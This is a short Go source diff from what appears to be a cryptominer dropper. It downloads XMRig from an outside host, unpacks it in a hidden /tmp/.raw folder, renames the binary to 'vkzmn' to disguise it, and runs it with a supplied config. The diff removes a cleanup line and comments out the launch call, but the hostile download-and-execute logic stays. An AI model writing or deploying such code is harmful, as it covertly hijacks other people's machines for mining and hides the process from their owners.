@@ -79,18 +79,15 @@ r ,  e    :=  http.NewRequest("GET" , "https://download.xmrig.com/xmrig/6.9.0/07
 
 
 
-rrrr   :=    exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *.raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )
+exec.Command("sh"  ,  "-c" , "cd /tmp/.raw ; tar  -xf *.raw ; cd *.0 ; rm config.json ; mv xmrig vkzmn ; ./vkzmn " + config )
 
 
 
-//clear  file  created by check  try 
-
-os.Truncate("/tmp/try_vkzmn" , 0)
 
 
  
 
-rrrr.Start()
+//rrrr.Start()
 
 
 
